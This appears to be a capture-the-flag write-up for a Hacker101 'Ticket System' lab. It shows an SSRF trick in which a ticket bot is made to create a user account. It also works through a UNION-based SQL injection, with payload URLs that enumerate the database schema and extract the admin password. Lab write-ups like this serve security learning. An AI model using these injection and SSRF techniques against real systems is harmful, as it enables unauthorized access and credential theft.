# Ticket System

## 1. Flag 1

Tried XSS and SQL Injection on newTicket page, Tried hydra on live admin page didn't work.

Hint said live instance runs same code as demo instance. 

Went to demo instance, home page had creds admin/admin provided. Tried creating new user. 

Interestingly, upon submitting new user form a get request is called 

`http://35.227.24.107/30d7de82d2/newUser?username=test&password=test&password2=test` 

Tried changing the IP and instance ID with the productions ones. Didn't work. 

Went on and watched a Hacker101 video related to SSRF, 

and found a clue; the demo page home page said

> If you have any problems, put in a ticket on our official instance -- only the knowledgebase bot looks at the tickets submitted here.

Created new ticket with body containing just 

`http://localhost/newUser?username=test&password=test&password2=test` `

Went to login in page and tried test and test. Worked !

Flag inside the first ticket.

## 2. Flag 2

From the research during search of previous flag I had gather following information.

* DB name: level7
* Tables: tickets and users

User:

Columns: id, username, password | [USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS TOTAL_CONNECTIONS] (db mgmt columns)

`http://35.227.24.107/30d7de82d2/ticket?id=5` is vulnerable to sql injection.

tried `http://35.227.24.107/30d7de82d2/ticket?id=6 union select 1,1,1` 

returned a page with 1 1 1 in reponse.

Ran 

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),1,1
```

Returned **level7** in response.

Ran

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),(select count(*) from information_schema.tables where table_schema="level7"),1
```

Retruned **2** 

Ran

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),(select table_name from information_schema.tables where table_schema="level7" limit 0,1),1
```

Returned **tickets**

Ran

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),(select table_name from information_schema.tables where table_schema="level7" limit 1,1),1
```

Returned **users**

Ran followings to get the column count and column names

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),(select count(*) from information_schema.columns where table_name="users"),1
```

Returned **6**

Ran

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),(select column_name from information_schema.columns where table_name="users" limit 0,1),1
```

Got **id**

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),(select column_name from information_schema.columns where table_name="users" limit 1,1),1
```

Got **username**

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),(select column_name from information_schema.columns where table_name="users" limit 2,1),1
```

Got **password**

Rest three columns where DB management related columns [USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS TOTAL_CONNECTIONS] irrelevant to us.

Now tried reading the password for admin.

```sql
http://35.227.24.107/30d7de82d2/ticket?id=6 union select (select database()),(select password from users where username="admin"),1
```

Retured the **FLAG**

